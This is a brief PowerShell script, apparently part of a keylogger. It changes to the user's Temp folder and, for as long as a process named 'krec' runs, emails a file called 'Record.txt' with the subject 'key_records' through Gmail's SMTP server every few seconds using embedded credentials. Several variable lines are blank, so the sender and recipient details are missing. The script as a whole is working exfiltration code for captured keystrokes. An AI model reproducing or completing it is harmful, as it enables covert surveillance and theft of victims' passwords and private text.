cd $env:USERPROFILE"\AppData\Local\Temp"
$SMTPServer = "smtp.gmail.com"
$SMTPPort = "587"
$
$

Do
{

$
$subject = "key_records"
$body = "key records"
$attachment = "Record.txt"

$message = New-Object System.Net.Mail.MailMessage
$message.subject = $subject
$message.body = $body
$message.to.add($to)
$message.from = $username
$message.attachments.add($attachment)
$smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);
$smtp.EnableSSL = $true
$smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
$smtp.send($message);

start-sleep 5

$message.Dispose() 

$proc = Get-Process



} While ($proc.name -contains 'krec') 
